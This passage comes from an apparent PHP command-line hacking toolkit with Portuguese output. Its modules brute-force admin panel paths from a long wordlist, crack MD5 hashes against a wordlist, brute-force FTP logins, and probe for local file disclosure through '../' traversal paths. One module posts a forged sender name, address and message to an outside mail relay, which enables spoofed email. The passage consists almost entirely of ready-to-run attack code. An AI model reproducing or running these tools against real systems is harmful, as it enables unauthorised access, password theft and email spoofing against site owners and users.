oject-admins/","phppgadmin/","pureadmin/","sql-admin/","radmind/","openvpnadmin/","izmysqladmin/","vadmind/","ezsqliteadmin/","hpwebjetadmin/","newsadmin/","adminpro/","otus_Domino_Admin/","bbadmin/","vmailadmin/","Indy_admin/","ccp14admin/","irc-macadmin/","anneradmin/","sshadmin/","phpldapadmin/","macadmin/","administratoraccounts/","admin4_account/","admin4_colon/","radmind-1/","Super-Admin/","AdminTools/","cmsadmin/","SysAdmin2/","globes_admin/","cadmins/","phpSQLiteAdmin/","navSiteAdmin/","server_admin_small/","ogo_sysadmin/","server/","power_user/","system_administration/","ss_vms_admin_sm/");
					foreach($website as $web){
						$caminho = $url . $web;
						$header  = get_headers($caminho);
						if(strstr($header[0], "200")){
						print "\n -------------------------------------------------------------\n";
						echo "\n[+] Found " . $caminho . "\n";
						print "\n -------------------------------------------------------------\n";
						$fp = fopen("admin.txt", "a");
						fwrite($fp, "[+] ".$caminho . "\n");
						}else{
							echo "[-] NOT Found " . $caminho . "\n";
						}

					}
				}
					$text = file_get_contents("admin.txt");
					print "\n ----------------------------------------------------------\n";
					echo "\n Paginas encontradas:\n {$text} \n";
					$fp = fopen("admin.txt", "w"); fwrite($fp, "");fclose($fp);
					print "\n ----------------------------------------------------------\n";
			}
		}

		if($argv[1] == "MD5"){

			$senha = $argv[3];
			$wordlist = file($argv[5]);
if(isset($argv[5])){
			if($argv[2] == "-s" && $argv[4] == "-w"){
			foreach($wordlist as $word){
				$word = str_replace("\r", "", $word);
				$word = str_replace("\n", "", $word);
				$password 	= md5($word);
				if($hash == false){
					if($password == $senha){
						print "\n--------------------------------------------------------\n";
						echo "[+] MD5 CRACKED | {$senha}: {$word} \n";
						print "--------------------------------------------------------\n";
						$hash = true;
						exit;
					}else{
						echo "[-] MD5 NOT CRACKED | {$senha}: {$word} \n";
						$hash = false;
					}
			}else{
				echo "Se esta com duvida de como usar use nosso painel de ajudas:\n 0x_Sec.php -h";
					}
				}
		}
		if($hash == false){
					echo "[-] Desculpe não foi possivel encontrar sua senha nessa wordlist tente uma maior!";
					}
				}

	if($argv[2] == "-e"){
		$senha = $argv[3];
		$pass = md5($senha);
		print "\n ----------------------------------------------------------\n";
		echo "[+] Encriptado: {$pass}";
		print "\n ----------------------------------------------------------\n";
	}
}

	if($argv[1] == "EMAIL"){
		if($argv[2] == "-m" && isset($argv[7])){
			$nome = $argv[3];
			$email = $argv[4];
			$assunto = $argv[5];
			$para = $argv[6];
			$mensagem = file_get_contents($argv[7]);

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "http://emailsender.eu5.org/");
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, "nome=$nome&email=$email&assunto=$assunto&para=$para&mensagem=$mensagem&start=true");
			$exec = curl_exec($ch);
			$fp = fopen("text.html", "w");
			fwrite($fp, $exec);
			if(strstr($exec, "Email Enviado")){
				print "------------------------------------------------------------\n";
				echo "\n[+] Mensagem Enviada para {$para}\n\n";
				print "------------------------------------------------------------\n";
			}else{
				echo "\n[-] Desculpe sua mensagem nao foi enviada!\n";
			}
				}
	}

	if($argv[1] == "FTPBRUTE"){
		$host = $argv[2];
		$port = 21;
		$time = 30;

		if($argv[3] == "-u" && $argv[5] == "-w"){
			$user 		= $argv[4];
			$list 		= file_get_contents($argv[6]);
			$wordlist 	=  explode("\n", $list);
			foreach($wordlist as $word){
				$con = ftp_connect($host, $port, $time);
				$log = ftp_login($con, $user, $word);
				

				if(!$log){
					echo "[-] FTP NOT Cracked " . $user . " | " . $word . "\n";
					ftp_close($con);
					str_replace("\r\n", "", $word);
				}else{
					print "----------------------------------------------------";
					print "\n";
					print "\n";
					echo "   [+] FTP Cracked: "."Host: ".$host." usuario: " . $user. " senha: ".$word . "\n";
					print "\n";
					print "----------------------------------------------------";
		exit;
				}
			}
			echo "\n";
			echo "Nao foi possivel crackear a senha use uma wordlist mais potente!";
			echo "\n";
		}
	}



	if($argv[1] == "LFD"){

		if($argv[2] == "-u"){
			$url = $argv[3];
			if(!strstr($url, "http://") && !strstr($url, "https://")){
				$url = "http://" . $url;
			}

			if(!isset($argv[4])){
				$arquivos = array("index", "../index", "../../index", "../../../index", "../../../index");
				foreach($arquivos as $arq){
					$junt = $url . $arq . ".php";
					$header = get_headers($junt);
					if(strstr($header[0], "200")){
						echo "[+] " . $junt."\n";
						system("start {$junt}");
					}else{
						echo "[-] " . $junt."\n";
					}
				}
			}
			if($argv[4] == "-db"){
				if(!strstr($url, "http://") && !strstr($url, "https://")){
					$url = "http://" . $url;
				}
				$comp = $argv[5];
				$opcs = array("{$comp}", "../{$comp}", "../../{$comp}", "../../../{$comp}");
				foreach($opcs as $opc){
					$link = $url . $opc;
					$head = get_headers($link);
					if(eregi("200", $head[0])){
						echo "[+] " . $link . "\n";
						system("start {$link}");
					}else{
						echo "[-] " . $link . "\n";
					}
				}
			}
		}
	}

	if($argv[1] == "BASE64"){
		if($argv[2] == "-e"){
			$codigo = $argv[3];
			$encode = base64_encode($codigo);
			print " ---------------------------------------------------\n";
			echo "\n [+] Encrypted: {$encode}\n\n";
			print " ---------------------------------------------------\n";
		}

		if($argv[2] == "-d"){
			$codigo = $argv[3];
			$decode = base64_decode($codigo);
			print " ---------------------------------------------------\n";
			echo "\n [+] Decrypted: {$decode}\n\n";
			print " ---------------------------------------------------\n";
		}
	}

?>